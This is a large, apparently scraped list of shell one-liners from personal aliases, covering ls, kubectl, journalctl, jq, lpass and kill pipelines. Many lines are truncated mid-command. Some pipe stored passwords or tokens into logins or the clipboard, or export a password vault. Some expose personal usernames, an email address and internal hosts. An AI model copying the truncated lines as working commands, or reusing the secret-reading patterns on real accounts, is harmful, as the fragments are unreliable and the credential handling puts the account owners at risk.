ls -1 *.png | xargs -n 1 bash -c 'convert \
ls -1 *.jpg | xargs -n 1 bash -c 'convert \
ls -1 *.go | grep -v _test
ls -1 $@| wc -l
ls --sort=time -l $@ | head -5
ls --sort=time -1 | head
ls --sort=oldest -l --color=always | head -n 20
ls --size --sort=size --reverse --almost-all --human-readable -1 --classify | grep --invert-match
ls --long --all --tree --color=always | less
ls --group-directories-first -F $ls_opts --color=always | less -R; ls --group-directories-first -F $ls_opts --color=always
ls --full-time /media/sda2/Zizik/ | awk '{print \$6\
ls --color| grep --color
ls --color=yes | less -R
ls --color=tty -l|grep --color=auto ^d
ls --color=tty -l|grep --color=auto ^-
ls --color=tty -la | grep -i
ls --color=none | xargs -i sh -c \
ls --color=no | lolcat
ls --color=never -ct|head -n 1
ls --color=never -1 -dtr ~/Pictures/* | tail -1
ls --color=never -1 -dtr ~/Downloads/* | tail -1
ls --color=auto | less -R
ls --color=auto | grep -i
ls --color=auto | grep --color=auto '/'
ls --color=auto | g
ls --color=auto -lihat | less
ls --color=auto -liha | less
ls --color=auto -lha | less
ls --color=auto -lhA |grep ^-
ls --color=auto -lhA |grep --color=never ^d
ls --color=auto -lhA | more
ls --color=auto -lhA | less
ls --color=auto -lh | less
ls --color=auto -laR | more
ls --color=auto -laF | more
ls --color=auto -la | less -r
ls --color=auto -lF /dev/ | grep
ls --color=auto -l | grep ^[-1]
ls --color=auto -d .!(|.)
ls --color=auto -ap | grep -v /
ls --color=auto -alCt | head -20
ls --color=auto -FlA | grep \*
ls --color=auto -FlA | grep :*/
ls --color=always|less -R
ls --color=always | less_color
ls --color=always | less -R
ls --color=always | less $LESSOPTS
ls --color=always | grep --color=always -i
ls --color=always | grep $@
ls --color=always -rtlh ~/downloads | tail -n 15
ls --color=always -lht | head
ls --color=always -lhFA | less -R
ls --color=always -lh | grep ^d
ls --color=always -lasth|less -R
ls --color=always -lasth | less -R
ls --color=always -lasth | less
ls --color=always -la | grep --color=never \
ls --color=always -lAh | less -R
ls --color=always -l | less -R
ls --color=always -l | grep ^d
ls --color=always -alh | grep ^d
ls --color=always -alF | less -R
ls --color=always -al | less -R
ls --color=always -al | grep ^d
ls --color=always -F -a | sort -dfu
ls --color=always -F -a -l | sort -dfu
ls --color=always -CF | less -R
ls --color=always -A | less -R
ls --color=always --group-directories-first -lhAb | awk {'print \$5\
ls --color=always --group-directories-first --classify -al | grep
ls --color | more
ls --color | less -r
ls --color | less -R
ls --color | less
ls --color | grep
ls --color -lht | head
ls --color -lhA | grep '^d'
ls --color -lag | more
ls --color -laFh | grep --color=never '^d'
ls --color -alF|more
ls --color -alFt|more
ls --color -F -la --file-type -h --group-directories-first | awk
ls --almost-all -d */ | sed 's:/*$::'
ls --almost-all --color=auto --classify --human-readable -l | grep -P '/$' --color=never
ls --almost-all --color=auto --classify --human-readable -l --recursive | grep -P '/$' --color=never
ls *|grep -i
ls *| wc -l
ls *py | xargs -L1 python
ls *eps | xargs -n 1 epstopdf
ls *_test.hs | xargs -I {} runhaskell -Wall {}
ls *.zip | xargs -n1 unzip -o
ls *.zip | parallel -j+0 --eta 'zip x {} >/dev/null'
ls err.txt succ.txt | wc -l
ls *.tex | pdflatex && open *.pdf
ls *.tex | entr pdflatex --interaction=nonstopmode
ls *.scala | grep -v \\$
ls *.png | parallel -j 4 compresspng
ls *.png | awk '{print \
ls *.png | awk
ls *.mp3 | while read FILE; do mpg123 $FILE; done
ls *.latexmain | xargs latexmk -pdf -pvc -silent
ls *.jar | xargs -Ifn sh -c 'echo fn;jar tf fn'
ls *.gz | wc -l
ls *.7z | parallel -j+0 --eta '7z x {} >/dev/null'
ls err.txt generated.file succ.txt | xargs -n1 --replace convert -verbose {} -resize 50% {}
ls err.txt generated.file succ.txt | grep
ls err.txt generated.file succ.txt | grep
ls '/David/projects/coding-challenges/AC/LeetCode/' | grep
ls ${long_list_options} | \grep --color=never '^l'
ls ${long_list_options} | \grep --color=never '^d'
ls ${long_list_options} | \grep --color=never '^-'
ls ${colorflag} | xargs -0 basename
ls ${colorflag} | /usr/bin/grep --color=never '^d'
ls ${PATH//:/ } | g
ls ${LSOPTIONS} -l | grep --color=never /
ls ${LSOPTIONS} -l | grep --color=never -v /
ls $LS_OPTIONS | grep -i
ls $LS_OPTIONS -lA `echo $1` | less
ls $LS_OPTIONS -ap | grep -v /
ls $LS_OPTIONS -al | more
ls $LS_OPTIONS -ahl | more
ls $LS_OPTIONS -Al | more
ls $LSOPTS | less -FX
ls $LLOPTS | less -R
ls $LLOPTS | less -FX
ls $HOME/names | cut -d
ls $HOME/Projects | fzf
ls $FUNCS_HOME | wc -l
ls $EC2_HOME/bin/ec2-* | grep -v cmd
ls $ALIAS_101_LFT/src/*.c | cut -d/ -f7
ls $@ | rev
ls $@ | lolcat
ls $1 | wc -l
ls !(*.sh)|wc -l
lrt|tail
lr |more
lr | rg
lr | head
lr | grep -i
lr --git-ignore | rg
lpwd | tr -d
lpass show --password okta.com | ~/work/okta.sh
lpass show --password docker.com | docker login -u jamesnaftel --password-stdin
lpass show --password OneLogin | sed
lpass show --pass lakpass.livesport.eu | kinit -r 7d --password-file=STDIN jan.hnizdil
lpass show --notes dockerstagepat | docker login -u manish --password-stdin registry-1-stage.docker.io
lpass show --notes dockerpat | docker login -u manisht --password-stdin
lpass ls | grep -i
lpass ls | grep
lpass ls | ag
lpass ls | ack '^.+\/(.+)\ \[id: (\d+)\]$' --output='$1:$2'
lpass ls --long | grep $1
lpass export | gpg -r brunno@brunno.me --encrypt > ~/dropbox/bkps/`date +%Y-%m-%d`-lastpass-bkp.csv.gpg
lparstat -i | grep Memory
lparstat -i | grep CPU
lorem -n 100 | pbcopy
lorem --sentences=25 | pbcopy
longcat | lolcat
lolcat | echo
logstalgia japh_selected_log -s 5 --output-ppm-stream - | ffmpeg -y -b 3000K -r 60 -f image2pipe -vcodec ppm -i - -vcodec libx264 -vpre slow -threads 0 logstalgia.mp4
login_init | rvm_init
logf | egrep -i debug
logcat-color | egrep $1
log-full | head
log | head -n 5
log | head
log HEAD~40..HEAD | ack david
log 10000 | G -A 2 -B 2 regula
log 10000 | G -A 2 -B 2
log -d | less
log -d | grep -1 --color=always
log --pretty=format:'%h %ad | %s%d [%an]' --graph --date=short
locate | grep $@
locate \* | grep -i
locate DBI | grep /usr/lib/perl5
locate DBD | grep /usr/lib/perl5
locate / | fzf -x
locate / | fzf
locate --regexp ~+|egrep
locate *.nse | grep
locate '*.bib' |xargs ack -i
locate $PWD | fzf
locate $HOME | egrep $1
localectl list-locales | grep zh_
localectl list-locales | grep en_
locale -a | grep UTF-8
lmutil lmstat -a -c 28001@INBLCORLIC02 | grep -i 'licenses'
lm | head
lm | grep rpm
lm | grep
ll|less
ll|grep drw
ll|grep
ll|P
llt | head
llq -f %id %jn %dq %st %c %h -u simonhe | grep -v CA
lll | grep
llext | _ls_by_extension
lla|grep
llast | xargs vim
llast | xargs less -iS
llast | xargs less -i
lla | nl -v 0
lla | more
lla | less
lla | grep -i
lla | grep
lla -F | \grep [^/]$
lla -F | \grep /$
lla --color=always | pager
ll2 | grep --color=always
ll ~/Notes | grep .md
ll |more
ll |less
ll |head
ll |grep ^d
ll |grep -ni
ll |grep
ll | wc -l
ll | tail -15
ll | tail
ll | sort -n -k 5
ll | sort -k $1
ll | rg
ll | peco
ll | nms -a -f green
ll | nl -v 0
ll | nl
ll | more
ll | m
ll | lolcat
ll | less -e
ll | less -R'
ll | less
ll | hh
ll | head -10'
ll | head -10
ll | head
ll | grep iwl
ll | grep ^l
ll | grep ^d
ll | grep ^[-l]
ll | grep \.md
ll | grep /$
ll | grep -v ^d
ll | grep -iP
ll | grep -i'
ll | grep -i $1
ll | grep -i
ll | grep -e -\>
ll | grep -G ^d
ll | grep -E '^d'
ll | grep --color=never '^d'
ll | grep --color=never '/$'
ll | grep --color=auto
ll | grep --color=always
ll | grep '^d'
ll | grep $1
ll | grep
ll | gr
ll | fzf -m
ll | fpp -ko -ai
ll | egrep -v
ll | egrep
ll | count
ll | awk
ll | ag
ll | \more
ll | \less
ll | ?
ll node_modules | grep oui
ll node_modules | grep '>'
ll db/migrate|tail -n10
ll `find . -name bower_components | xargs`
ll /etc/php/7.1/fpm/conf.d/ | grep xdebug
ll /dev | grep sd
ll -va | grep --ignore-case --color=auto
ll -t |vN -
ll -t |head
ll -t | tac
ll -t | less
ll -t | head
ll -t err.txt generated.file succ.txt | head -1
ll -rt | tail
ll -p | grep /
ll -p | grep -v /
ll -lrt | tail -3
ll -lath | head
ll -lF | m
ll -l | grep ^l
ll -h | tail -20
ll -h | grep -i
ll -h | grep
ll -d .!(|.)
ll -d err.txt generated.file succ.txt | grep ^d
ll -a|grep
ll -a | sort +4 -rn
ll -a | lolcat
ll -a | less
ll -a | grep -i
ll -a | grep $*
ll -a | grep
ll -a --time-style=+%D | grep `date +%D`
ll -S|head
ll -S| head -3
ll -S | less
ll -S | h5
ll -RS | less
ll -RF | less
ll -R | grep -iP
ll -R --color=always | less -r
ll -GF | sort -dfr
ll -F | less
ll -F | grep /
ll -A | less
ll --sort=time | less
ll --sort=t | head
ll --group-directories-first | less
ll --group-directories-first --color=always|less -SR
ll --color=auto -F | ~/rocolor.pl
ll --color=always | pager
ll --color=always | less -R -FX
ll --color=always | less -R
ll --color=always | less
ll --color=always | grep --color=never
ll --color=always | \grep /$
ll --color-never | le
ll --color | less -R
ll --color | less
ll $* | less -r
ljam -j8 -sPROJECT=router.jam 2>&1 | tee enxrlog.txt
listsourcefiles | xargs tar -cjvf $@
listpackages | grep -v deinstall
listf | grep -e \
listaliases | grep
list_node_packages peerDependencies | yarn-install-latest --save-peer
list_node_packages peerDependencies | npm-install-latest --save-peer
list_node_packages optionalDependencies | yarn-install-latest --save-optional
list_node_packages optionalDependencies | npm-install-latest --save-optional
list_node_packages devDependencies | yarn-install-latest --save-dev
list_node_packages devDependencies | npm-install-latest --save-dev
list_node_packages dependencies | yarn-install-latest --save
list_node_packages dependencies | npm-install-latest --save
list_node_packages bundledDependencies | yarn-install-latest --save-bundled
list_node_packages bundledDependencies | npm-install-latest --save-bundled
listLocalBranches | xargs git branch -d
listLocalBranches | xargs git branch -D
list | grep linux-image-
list | grep linux-headers-
list | grep
links -dump http://www.formyip.com/ | grep \
lighthouse | sh
licmae | grep -A 3 DESMOND_GPGPU
lh|less
lh | sort -k 5 -h
lh | lolcat
lgtoday -p | diffstat
lgtm -m | pbcopy
lg __1__ && cat __1__|pbcopy && rm -f __1__
lfi=`/usr/bin/ls -t ${tomcatLogDir}/catalina*.log | head -1`; tail -f ${lfi}
lf | grep
lesson-ls && pbpaste | xargs ./lesson-dl
less ~/.zshrc | ack -o \
less ~/.zsh/aliases.zsh | grep -A 1 -B 1
less ~/.vpn_pw | copy
less ~/.sso_pw | copy
less ~/.ssh/id_rsa.pub | pbcopy && echo 'Copied to clipboard'
less ~/.ssh/id_rsa.pub | pbcopy
less ~/.ssh/config | grep Host
less ~/.bashrc | grep cd
less ~/.bashrc | grep alias --color=never
less | lolcat
less `ls -trC1 /opt/ptc/windchill/logs/MethodServer*.log | tail -1`
less `ls -trC1 /opt/ptc/windchill/logs/BackgroundMethodServer*.log | tail -1`
less `ls -rt | tail -n 1`
less `ls -l | head -1`
less `ls -A1t | head -1`
less `ls -1t | head -1`
less `ls -1rt *.log | tail -1`
less `ls err.txt succ.txt | shuf -n 1`
less /var/log/syslog | grep -i cron
less /var/log/apache2/access.log | grep -v 403
less /home/pete/tel | grep -i
less -eMQRin `ls -t | head -n 20`
less -S +F `ls -1t **/*stamped* | head -1`
less -R `ls -tr1|tail -1`
less -R -j -1 -p 'changed:' $(ls -1 /var/log/ansible/$USER/ansible-* | tail -1)
less +%F $(ls -t | head -n 1)
less $PGDATA/pg_log/`ls -t $PGDATA/pg_log/ | head -1`
less $HOME/.oh-my-zsh/plugins/git/git.plugin.zsh | grep alias
less $HOME/.help | open -f -a Marked\ 2
less $@ | colorize
less $(ls -rt | tail -n 1)
less $(find . -type f -maxdepth 1 | peco)
less $(find . -type f -follow -maxdepth 1 | peco)
less $(echo `ls -t | head -n 1`)
lein repl |& tee log
lein classpath | sed -e 's/:/\'$'\n/g'
ledger --real bal assets\|liabilities
le1 | shuf -n 1
ldconfig -p | grep
ldconfig --print-cache | ack -i
lc | less_color
lc test $1 | echo sed 's/\\n/\n/g'
lc -a | less_color
la|less
la|grep '^d'
la|grep
launchctl list|grep '\sme\.'
launchctl list|grep
launchctl list |grep homebrew; echo REMOVE WITH: launchctl remove ...;
launchctl list |grep goa
launchctl list | grep tvrss
launchctl list | grep secure && echo 'launchctl remove todos los listados'
launchctl list | grep emacs
launch_cur_dir | cc; cv
lastlog|grep -v \*
lastlog | grep -v '**Never logged in**'
lastcommit | pbcopy
last |grep still
last | less
last | head -n $(( +LINES ? LINES - 4 : 20 ))
last | head -$((LINES-1))
last | head
last | grep -v 'still logged in'
last | grep 'still logged in'
last | fpp
last | awk '{print \$3}'
last | awk
last reboot | head -2
last -x | grep shutdown
last -w $USER | \grep $USER
last -t console | \grep $USER
last -i | head
last -a|ccze -A
last -ad | head -n 15
last -a | less
last -a | head -15
last -Fia | head
largest_pkgs | awk '{ sum += $1 } END { print sum }'
lal | head
la |less
la | wc
la | rg ^d
la | rg ^-
la | rg
la | nms -a -f green
la | nl
la | more -R
la | more
la | lolcat
la | less -R
la | less
la | grep ^d
la | grep -v ^d
la | grep -i
la | grep -e -\>
la | grep --color=never ^d
la | grep '\->'
la | grep
la | $PAGER
la /usr/local/bin | grep
la . | grep
la -t | head -n21
la -p | grep -v /
la -l|grep ^d
la -l|grep ^-
la -latr | tail
la -lah | grep -P $HIDDEN
la -h | more
la -U | less
la -R | grep
la -Flh | grep gregorl
la --sort=time | less
la --color=always | less
la --color | less -R
la ${colorflag} | $PAGER
l1 | wcl
l1 | wc -l
l. | more
l. | grep -i
l$l | r$r
l |more
l |less
l |grep
l | wc -l
l | tail
l | rg $1
l | peco
l | more
l | m
l | less -r
l | less -e
l | less -R
l | less
l | lc
l | igrep
l | head -n 25
l | head -50
l | head -20
l | head -10
l | head
l | grp
l | grep tb
l | grep ^d
l | grep /
l | grep -v '\.'
l | grep -i $1
l | grep -i
l | grep -E '[^_tb].v\$'
l | grep --color=never ^d
l | grep --color=always $1
l | grep '^d'
l | grep $1
l | grep
l | gr
l | g? \$1
l | g
l | fpp -c code
l | awk -f $HOME/bin/today_filter.awk
l | ack $1
l | ${PAGER}
l T*.data | wc -l
l /usr/local/bin | grep cargo/bin
l . | wc
l . | grep -i
l . | grep
l -t|head
l -t | less
l -t | head
l -ptr --color=always | grep -v /
l -p | grep -v /
l -p --color=always | grep -v /
l -lrt *(.) | tail
l -lrt *(.) | head
l -lSh *(.) | head
l -l | grep
l -d . .. | less
l -d */ | less
l -a | less
l -a --color=always | less
l -S | head
l -R | grep -i
l -Al | more
l -1 | wc -l
l --sort modified -r --color always | head -21
l --color=never|m
l --color=always | less
l --color=always | grep ^d --color=never
l --color=always | grep -v ^d --color=never
l --color | less -R
kubeseal --token $(aws-iam-authenticator token -i kubernetes-infra | jq -r
kubelogin --username moritz.bracht --password $(pass figo-ldap | head -1)
kubelogin --username christian.koehn --password $(pass ldap-new | head -1)
kubectx $(kubectx | fzy) >/dev/null
kubectlpro top pod | sed
kubectlpre top pod | sed
kubectlint top pod | sed
kubectl version -o yaml | yq r - 'serverVersion.gitVersion'
kubectl port-forward -n istio-system $(kubectl get po -l app=kiali -n istio-system -o json | jq
kubectl port-forward -n istio-system $(kubectl get po -l app=grafana -n istio-system -o json | jq
kubectl port-forward $(kubectl get pods -n ingress-nginx -o name -l app=auth-ingress-nginx | head -n 1) 8443:443 -n ingress-nginx
kubectl logs | grep
kubectl logs -n kube-system $(kubectl get po -n kube-system | egrep -o
kubectl logs -f $1 | jq
kubectl logs $(kubectl get po | egrep -o
kubectl get svc|grep
kubectl get service | grep
kubectl get service --all-namespaces | grep
kubectl get replicaset.apps | grep -E \
kubectl get pvc | grep
kubectl get pv | grep
kubectl get pod|grep
kubectl get pods | rg sanbase
kubectl get pods | rg influxdb
kubectl get pods | grep ${PWD##*/}
kubectl get pods | grep
kubectl get pods | ag
kubectl get pods -w | grep
kubectl get pods -o wide | awk
kubectl get pods -o wide --all-namespaces | grep -v Running
kubectl get pods -o wide --all-namespaces | grep
kubectl get pods -o wide --all-namespaces | awk
kubectl get pods -o jsonpath='{..image}' | tr -s '[[:space:]]' \
kubectl get pods --sort-by=.status.startTime | tail -n +2
kubectl get pods --namespace=broadband --watch | grep broadband-web-staging
kubectl get pods --namespace=broadband --watch | grep broadband-web-produc
kubectl get pods --namespace=broadband --watch | grep broadband-web-cms
kubectl get pods --all-namespaces |grep -v Running
kubectl get pods --all-namespaces | grep -v Running
kubectl get pods --all-namespaces | grep
kubectl get pods --all-namespaces -o wide | awk
kubectl get pods --all-namespaces --field-selector 'status.phase==Failed' -o json | kubectl delete -f -
kubectl get pod | fzf
kubectl get po | grep -v Running
kubectl get po | grep ${PWD##*/}
kubectl get nodes -ojson | jq '.items[].status.capacity'
kubectl get nodes -o name | xargs -I{} kubectl uncordon {}'
kubectl get nodes -o name | xargs -I{} kubectl cordon {}
kubectl get nodes -l node-role.kubernetes.io/master -o yaml | yq -r '.items[0].metadata.labels.ip'
kubectl get nodes --no-headers | awk
kubectl get nodes --no-headers --sort-by=.metadata.creationTimestamp |cat -n
kubectl get machines --no-headers --sort-by=.metadata.creationTimestamp |cat -n
kubectl get events --sort-by='.metadata.creationTimestamp' | tail -8
kubectl get events --no-headers --sort-by=.metadata.creationTimestamp |cat -n
kubectl get deployment | grep
kubectl get configmaps cattle-controllers -n kube-system -o json | jq -r '.metadata.annotations[\
kubectl get all --all-namespaces | less
kubectl get --output json pods | jq --raw-output '.items[].spec.containers[].name' -n
kubectl exec -i -t $(kubectl get pods -o json -l app=postgis-postgresql | jq
kubectl describe service kubernetes-dashboard --namespace=kube-system |grep ^NodePort
kubectl describe pods | grep '^name.*notebook-andrew' -i
kubectl describe deployments | grep Image
kubectl config view | grep namespace:
kubectl config view | grep namespace -B 1
kubectl config view | grep namespace
kubectl config view | grep current-context
kubectl config view -o jsonpath='{.contexts[*].name}' | tr ' ' '\n'
kubectl config view --minify | grep namespace:
kubectl config view --minify | grep namespace
kubectl config use-context \$(kubectl config get-contexts -o=name | fzf)
kubectl config use-context $(kubectl config get-contexts -o=name | fzf)
kubectl config set-context $(kubectl config view | awk '/current-context/ {print $2}') --namespace=spay-tee-be-dev
kubectl config get-contexts | grep wisdom
kubectl config get-contexts | awk '/\*/ { print \$2 \
kubectl config get-contexts -o=name | sort -n
kubectl config get-contexts --no-headers | awk '{print \$5}'
kubectl api-resources | less
kubectl api-resources | grep
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -o name
kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 kubectl get --show-kind --ignore-not-found
kubectl api-resources --verbs=list --namespaced -o name | grep -v
kubectl -n region2 get pods | grep
kubectl -n kube-system port-forward $(kubectl get pods -n kube-system -l k8s-app=kubernetes-dashboard | awk {
kubectl -n kube-system logs $(kubectl -n kube-system get pods -l k8s-app=kube-apiserver -o name | head -1)
kubectl -n kube-system exec -c portworx -ti $(kubectl -n kube-system get pods -l name=portworx -ocustom-columns=NAME:.metadata.name --no-headers | head -n1) -- /opt/pwx/bin/pxctl
kubectl -n kube-system describe secret kubernetes-dashboard-token | awk
kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | awk
kubectl -n cyral logs deployment/pg-analyzer | grep -i enduser --color=NEVER
kubectl -n cyral logs deployment/mysql-analyzer | grep -i enduser --color=NEVER
kubectl -n cyral logs deployment/cassandra-wire | grep -i enduser --color=NEVER
kubectl -n com-att-ocnp-mgmt exec -it $POD -- gluster peer status | grep -i peers
kubectl -n $APPNS describe pods | grep FailedMount
kubectl -n $APPNS describe po $APOD | grep -i events -A 20
kubectl --namespace <namespace> get pods -a | grep backup
kube_list | grep \
ktlint -F $(fd -e kt | fzf)
kspod -o wide | grep'
kpod -o wide | grep'
knife status | grep
knife role list | grep
knife node list | sort
knife node list | grep
knife environment list | grep
knife ec2 server list | grep running
knife data bag list | grep
knife cookbook list | grep
knife client list | grep
kl | ag -A 15 ERROR
killport 9160; killport 9042; sudo docker run -p 9160:9160 -p 9042:9042 -e HOST_IP=\${HOST_IP:-\$(hostname -I | awk '{print \$1}')} --name cassandra -d docker.liveopslabs.com/cassandra
killport 9092; sudo docker run -p 9092:9092 --name kafka -e HOST_IP=\${HOST_IP:-\$(hostname -I | awk '{print \$1}')} -v /data/kafka/logs:/var/log/supervisor:rw -v /data/kafka/logs:/var/log/kafka:rw -d docker.liveopslabs.com/kafka
killall tail | true && tail -f nohup.out &
killall python2.7; ps aux | grep -i twi
killall -kill Finder | killall -kill Dock
killall -9 .rotator | exit 0 && lxsession-logout
kill_by syslog-ng; sleep 1; ps -A | grep syslog
kill `ps auxww | awk
kill \$(jobs -l | fzf)
kill -s USR2 `xprop -root _BLACKBOX_PID | awk '{print $3}'`
kill -s USR2 `xprop -root _BLACKBOX_PID | awk
kill -SIGHUP `xprop -root _BLACKBOX_PID | awk '{print $3}'`
kill -SIGHUP $(xprop -root _BLACKBOX_PID | awk '{print $3}')
kill -INT $(ps aux | grep
kill -CONT $(pgrep emacs | xargs)
kill -9 `ps x | grep
kill -9 `ps awx | grep java`
kill -9 `ps -u pi | awk
kill -9 \`ps aux G tomcat GV grep | awk '{print \$2}'\`
kill -9 $(ps aux | grep puma) &>/dev/null
kill -9 $(lsof -i :3001 | awk '{print $2}'); echo '(┛ò__ó)┛彡 ᴉɟᴉuᴉɯpɐ'
kill $(pstree -pT | grep -m1 -o
kill $(ps | awk
kill $(ps aux|grep
kill $(ps aux | peco)
kill $(ps -ef|fzf --header-lines 1)
kill $(ps -e G davidsu/.nvm/versions/node/v8.11.3/bin/node G santa-editor.js | cut -c1-5)
kill $(ps --no-headers --sort=start_time -C mosh-server -o pid | head -n -1)
kgpww | grep -v -e arm-exporter -e fluent-bit -e kube-flannel-ds -e kube-proxy -e local-volume-provisioner -e metallb-speaker -e node-exporter -e restic
kget pods | grep -v cronjob
kge | wc -l
keyring get rpi pi | xclip -sel clip
key_swap ~/.qwerty | xmodmap -
key_swap ~/.dvorak | xmodmap -
kextstat |grep EasyTether
kextstat | grep intel
kextstat | grep -v com.apple
kextstat | grep -v apple
kextstat | grep -i FTDI
kextstat -kl | grep -v com.apple
kextstat -kl | awk '{printf \
kextstat -kl | awk ' !/apple/ { print $6 } '
kdevelop &>/dev/null&|
kd | grep '^name.*notebook-shleifer' -i
kctx \$(kubectl config get-contexts -o name | pick)
kcachegrind $(ls callgrind* -rt | tail -n 1)
kc get pods | grep staging-wolverine-credit-service
kc get pods | grep cat
kc get jobs | grep cat
kc get deployments | grep cat
kc config get-contexts | grep \
kbn $(kb get ns | fzf)
k.zsh | less
k get po | grep
k get events — sort-by='.metadata.creationTimestamp' |tail -8
k get events — sort-by='.metadata.creationTimestamp' |tail -
k exec -it \$(k get pods |awk '/gl-cly-jup.*Running/{print \$1; exit}') -c gl-cly-jup bash
k exec -it \$(k get pods |awk '/gl-cly-jup.*Running/{print \$1; exit}') -c gl-cly-jup 'bash -c \
k exec -it \$(k get pods |awk '/gitlab-celery.*Running/{print \$1; exit}') bash
k exec -it $(kgpn | fzf)
k edit secret $(kgsecn | fzf)
k edit cronjob $(kgcjn | fzf)
k edit cm $(kgcmn | fzf)
k describe pods | grep '^name.*flowcast-prod' -i
k describe $(k get services -o name | fzf)
k describe $(k get serviceaccounts -o name | fzf)
k describe $(k get secrets -o name | fzf)
k describe $(k get replicationcontrollers -o name | fzf)
k describe $(k get replicaset -o name | fzf)
k describe $(k get pods -o name | fzf)
k describe $(k get persistentvolumeclaims -o name | fzf)
k describe $(k get nodes -o name | fzf)
k describe $(k get namespaces -o name | fzf)
k describe $(k get jobs -o name | fzf)
k describe $(k get ingresses -o name | fzf)
k describe $(k get events -o persistentvolumes | fzf)
k describe $(k get events -o name | fzf)
k describe $(k get endpoints -o name | fzf)
k describe $(k get deployments -o name | fzf)
k describe $(k get cronjobs -o name | fzf)
k describe $(k get configmaps -o name | fzf)
k delete pod $(kgpn | fzf)
k delete cronjob $(kgcjn | fzf)
k delete cm $(kgcmn | fzf)
k -h --group-directories-first | less -R
jurl | pbcopy
jupyter-notebook --no-browser --allow-root 2>&1 | tee jup.txt
jupyter notebook --ip $(ip addr show eth0 | grep -Po 'inet \K[\d.]+')
jumanpp | knp
jstackMavenTest | grep oozie
jstackMavenTest | grep hadoop
jstackMaven | grep Test
jsonpp | pygmentize -l json
jsonlint | python -m json.tool
json_pp | pygmentize -l json
json_pp | colorize
json_pp -t dumper <~root/kiwi.config/kiwi.json | grep rx_name
json | pygmentize -l json
json | pygmentize -f terminal256 -l javascript -O style=monokai
jsfiles | xargs grep $@
js-yaml | jq
jrnl -from yesterday -to yesterday --export json | jq
jrnl -from today --export json | jq
jrnl --export text | less -RMSFiX
jqhead1; kc get po -o json | jqinfo1
jqhead1; kc get po --all-namespaces -o json | jqinfo1
jqc . | lessc
jq . | less
jq . | jid
jq . service.log | less
jq . -C|less -R
jq . -C | less -R
jq . -C | le
jq . --color-output | less -R
jq -rR 'fromjson? | \
jq -r '.suites[].cases[] | select(.status==\
jq -S -C . | less -r
jq -R -s '. | split(\
jq -R 'fromjson? | select(type == \
jq -C | less -R
jq -C | fzf --ansi
jq -C . | less -r
jq -C . | less -SRi
jq -C . | less -R
jq -C . | less
jq -C -S . | less
jq -C '.' | less -R
jq -C '.' | less
jq --color-output . | less -R
jq --color-output --sort-keys | less
jq '{time: (.time + 9*60*60 | strftime(\
jq 'select(.status | match(\
jq 'select(.request | match(\
jq 'map(.Tags = (.Tags // [] | from_entries))'
jq '[path(..)|map(if type==\
jq '.|length'
jq '.version' package.json | tr -d '\
jq '.token' | tr -d '\
jq '.nodes | map(del(.content))'
jq '.items | length'
jq '.cells[] | select(.cell_type == \
jq '.' | vim -c 'set syntax=json nowrap nofoldenable' -
jq '.' -C | more -R
jq '.' -C | less -R
jq '.' --color-output | less -R
jps -vl | sed s/-/\
jps -v | grep -e
jps -q |xargs pwdx
jps -ml | grep hive
jps -ml | grep hdfs
jps -ml | grep hbase
jps -lv|rg $1
jps -l | sort -k2
jps -l | sort
jps -l | awk '\$2==\
journalctl | grep 'fail'
journalctl | $PAGER
journalctl -x|most
journalctl -xe | lnav
journalctl -xe | egrep -i sshd
journalctl -xb | grep rror
journalctl -xab |less +G
journalctl -k -f | grep FIREWALL
journalctl -fu ModemManager | raffaello -f modemmanager
journalctl -fn 100 --no-hostname --utc | ccze -A
journalctl -f | grcat conf.journal
journalctl -f | ccze -A
journalctl -f -all | ccze -A
journalctl -f $@ | ccze $CCZEOPTS
journalctl -er | nvim -R -c 'set ft=messages'
journalctl -b | grep
journalctl -b | grcat conf.journal
journalctl -b -x| grep -B2 -A3 -i
journalctl -b -p err|less
journalctl -b -n50| ccze -A
journalctl -b -k -f | ccze -A -o nolookups
journalctl -b -1 | ccze -A
journalctl -b -0 | ccze -A
journalctl -b --no-pager | grep
journalctl -af | ccze -A
journalctl -a | lnav
journalctl --system -x | grep warn
journalctl --system -x | grep fail
journalctl --system -x | grep error
journalctl --system -x | grep denied
journalctl --no-pager | micro
journalctl ${LOG_COMPLETE} $LOG_CAT $LOG_NOHOST | grep -i --color
journalctl ${LOG_COMPLETE} $LOG_CAT $LOG_NOHOST --since -7d | grep -i --color
journalctl ${LOG_COMPLETE} $LOG_CAT $LOG_NOHOST $LOG_ONEWEEK | grep -i --color
jot -r -c 160 . z | rs -g 0 10
jot -r -c 16 A z | rs -g 0
jot -b# $(tput cols) | tr -d
joplin ls -l | fzf
jobs | tail -20
jobs | awk
jobs -ps | xargs kill -9
jobs -p | xargs kill -9
jobs -p | xargs kill -15
jobs -p | xargs kill
jobs -p | wc -l
jobs -p | listkill
jobs -l | awk
jlwd|awk -F \
jj-kernel-grub-ls | tail -n 1
jj-kernel-grub-ls | head -n 1
jj-jc-boot-current | grep -ve pulseaudio -ve dbus -ve audit -ve gdm-x-session -ve nagios -ive NetworkManager -ve dnsmasq -ve grafana -ve com.redhat -ve influxd -ve smart -ve 'system activity accounting tool' -ve sshd -ve chronyd -ve run-parts -ve nm-dispatcher
jiracli --sprint FBO | grep -i \
jira | xargs -I{} -n1 bash -c 'open
jira sprint -r 'Webclient Sprints' | less
jira sprint -r 'Webclient Sprints' | grep 'open'
jira sprint -r 'Webclient Sprints' | grep 'miguel'
jira sprint -r 'Webclient Sprints' | grep 'in progress'
jira mine | sed -e 's#Awaiting Customer/Purchase#wait #g'
jira job|lolcat
jilla ls | grep $1
jfiles | xargs grep $@
jekyll serve -B && jekyll build --watch -q &> /dev/null &|
jc | tail -200
jc -b -f | cat
jb | less
java `\ls *.class | cut -d
java -XX:+PrintFlagsFinal -version | grep ThreadStackSize
java -XX:+PrintFlagsFinal -version | grep HeapSize
ix | xclip && xclip -o
iwlist wlan0 scanning | grep ESS
iwlist wlan0 scan | grep ESSID
iwlist wlan0 scan | grep
iwconfig wlp3s0 | grep -i --color quality
iwconfig wlp1s0 | grep -i --color quality
iwconfig wlan0 | grep -i signal
iwconfig wlan0 | grep -i quality
iwconfig 2>/dev/null | awk
iw wlan0 scan | grep SSID > $wifi_scan_results_file
iw dev wlp3s0 scan | grep 'SSID: .'
irssi -c 2001:6e0:208:0:204:76ff:fe23:2024 -n leaf\|v6
ircat tvsh |ssh 192.168.5.1 /video/tmp/tv-remote.sh
iptables-save | grep '^[^:#]'
